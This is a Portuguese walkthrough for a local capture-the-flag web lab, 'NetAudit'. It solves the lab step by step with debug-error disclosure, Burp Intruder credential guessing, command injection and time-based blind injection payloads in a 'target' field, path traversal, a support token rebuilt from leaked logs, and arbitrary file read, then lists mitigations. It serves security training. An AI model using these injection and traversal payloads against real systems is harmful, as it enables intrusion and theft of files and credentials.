# Walkthrough - Lab 03 NetAudit

Este guia acompanha uma resolucao manual pelo navegador, DevTools e Burp Suite. Ele segue o raciocinio de um analista: observar a aplicacao, capturar requisicoes, alterar poucos campos por vez, correlacionar pistas e confirmar impacto.

## 1. Reconhecimento pre-auth e debug disclosure

Abra:

```text
http://127.0.0.1:8090
```

A tela de login nao mostra credenciais. Faca uma tentativa qualquer e capture o `POST /api/auth/login` no Burp Proxy ou no DevTools Network.

Observe que a requisicao envia campos alem de `username` e `password`. Envie a request para o Repeater e altere `returnUrl` para uma aspas simples:

```json
{
  "username": "teste",
  "password": "teste",
  "client": "web",
  "returnUrl": "'"
}
```

A resposta deve ser `HTTP 500` com um erro de debug do parser de redirect. Nao e SQL Injection; e um vazamento de stack trace e paths internos.

No erro, identifique:

```text
/old/deployment-notes.txt
/backup/readme.txt
```

Leia `/old/deployment-notes.txt`, encontre `username: analyst`, teste a senha antiga `analyst2022` e confirme que falha. Depois acesse `/backup/readme.txt`, que aponta para:

```text
user-candidates.txt
password-candidates.txt
```

Use Burp Intruder com `Cluster Bomb`:

1. Capture um novo `POST /api/auth/login`.
2. Marque `username` como Payload set 1.
3. Marque `password` como Payload set 2.
4. Carregue as duas listas pequenas.
5. Compare `200` vs `401`, tamanho da resposta e `Login successful`.

Se voce ja validou o usuario `analyst`, tambem pode fixar o username e testar apenas a wordlist de senhas.

A combinacao correta e:

```text
analyst:analyst123
```

Antes de entrar no painel, volte as notas antigas. A linha `Access review note: access-review.txt` aponta para:

```text
/old/access-review.txt
```

Flag:

```text
FLAG{pre_auth_debug_disclosure_lab3}
```

## 2. Dashboard e request tampering

Depois do login, clique em `Verificar` em qualquer ativo. Capture o `POST /api/assets/check`:

```json
{
  "assetId": "gw-01",
  "checkType": "icmp",
  "target": "gateway.local"
}
```

`target` nao e editavel na UI, mas chega do cliente ao backend. A falha nao pertence a um card especifico: qualquer card usa a mesma feature de check.

## 3. Command Injection com output

No Repeater, altere apenas `target`.

Confirme execucao:

```text
127.0.0.1; whoami
```

Entenda o contexto:

```text
127.0.0.1; pwd
127.0.0.1; ls -la
127.0.0.1; ls -la /app
127.0.0.1; ls -la /app/flags
```

Depois leia a evidencia da superficie:

```text
127.0.0.1; cat /app/flags/flag1.txt
```

Flag:

```text
FLAG{command_injection_ping_lab3}
```

## 4. Blind/Time-Based Command Injection no agente

Abra `/js/app.js` ou leia pistas dos logs. Ha um endpoint sem botao na UI:

```text
/api/agents/tcp-probe
```

Monte manualmente:

```http
POST /api/agents/tcp-probe
Content-Type: application/json
Cookie: session=...
```

```json
{
  "target": "127.0.0.1",
  "port": "80"
}
```

O endpoint retorna apenas metadados. Para validar a injecao por tempo:

```json
{
  "target": "127.0.0.1; sleep 5; #",
  "port": "80"
}
```

Compare o tempo da resposta e `durationMs`. A flag nao aparece no JSON.

Para gerar um efeito colateral seguro:

```json
{
  "target": "127.0.0.1; cp /app/flags/flag_time.txt /app/public/reports/tcp-proof.txt; sleep 5; #",
  "port": "80"
}
```

Depois acesse:

```text
http://127.0.0.1:8090/reports/tcp-proof.txt
```

Flag:

```text
FLAG{blind_time_based_command_injection_lab3}
```

## 5. Resolver legado e metadata disclosure

No JavaScript, procure:

```text
/api/assets/resolve
```

Tambem ha uma pista de formato de payload com `target`. Monte:

```http
POST /api/assets/resolve
Content-Type: application/json
Cookie: session=...
```

```json
{
  "target": "dns01.local"
}
```

Teste targets vistos no dashboard, como `gateway.local`, `dns01.local`, `intranet.local` e `backup01.local`. O endpoint devolve metadados internos de resolucao.

Em `app.log`, procure a pista:

```text
legacy resolver still accepts internal metadata target for support checks
```

Teste:

```json
{
  "target": "internal-metadata"
}
```

ou:

```json
{
  "target": "metadata"
}
```

Flag:

```text
FLAG{hidden_resolver_metadata_disclosure_lab3}
```

## 6. Support diagnostics e Path Traversal

No JS, encontre `support.html` e abra a pagina. O campo `Log file` usa:

```text
/api/support/log?file=app.log
```

Leia `app.log`. Ele aponta para:

```text
[debug] archived incident review details moved to audit.log
```

Abra `audit.log` no mesmo viewer. Ele revela:

```text
[review] incident evidence moved outside data directory
[review] evidence relative hint: flags/flag4.txt
[review] log viewer base directory: /app/data
```

Se a base e `/app/data`, use traversal:

```text
../flags/flag4.txt
```

Flag:

```text
FLAG{path_traversal_log_viewer_lab3}
```

## 7. Token interno, Broken Access Control e diagnostics

Ainda em `app.log`, monte o token:

```text
support token prefix: netaudit
support token middle: debug
support token suffix: 2026
```

Resultado:

```text
netaudit-debug-2026
```

Sem header, `/api/internal/health` retorna `403`. Com:

```text
X-Support-Token: netaudit-debug-2026
```

o health revela:

```text
diagnosticEndpoint: /api/internal/diagnostics
backupEndpoint: /api/internal/backup
backupMethod: POST
requiredParameter: includeFile
```

Chame:

```text
GET /api/internal/diagnostics
X-Support-Token: netaudit-debug-2026
```

Resposta importante:

```text
FLAG{internal_diagnostics_token_abuse_lab3}
backupManifest: /app/data/backup-manifest.log
```

## 8. Backup interno com Arbitrary File Read

O health ja informou que o backup usa `POST` e `includeFile`. Use primeiro um arquivo normal:

```json
{
  "includeFile": "data/app.log"
}
```

Depois leia o manifesto indicado pelo diagnostics:

```json
{
  "includeFile": "data/backup-manifest.log"
}
```

Ele mostra:

```text
[backup] final proof file: flags/root.txt
```

Entao leia:

```json
{
  "includeFile": "flags/root.txt"
}
```

Flag final:

```text
FLAG{admin_backup_arbitrary_file_read_lab3}
```

## 9. Mitigacoes

Mitigacoes principais:

- nao usar `exec` com concatenacao;
- separar endpoints administrativos de fluxos comuns;
- validar destinos e portas com allowlists;
- nao expor metadata de suporte sem necessidade;
- nao vazar stack traces e paths internos;
- nao publicar listas de credenciais;
- validar nomes de arquivo por allowlist e caminho resolvido;
- nao confiar em token estatico vazado em logs;
- aplicar autenticacao e autorizacao reais para endpoints internos.

## Dicas progressivas

1. Se a UI nao mostra um valor editavel, olhe a requisicao capturada.
2. Se nao existe output, compare tempo e efeitos colaterais.
3. Comentarios, constantes JS e logs podem revelar fluxos sem link.
4. Metadata de suporte tambem pode ser sensivel.
5. Se uma funcionalidade le arquivos, pense na base usada pelo backend.
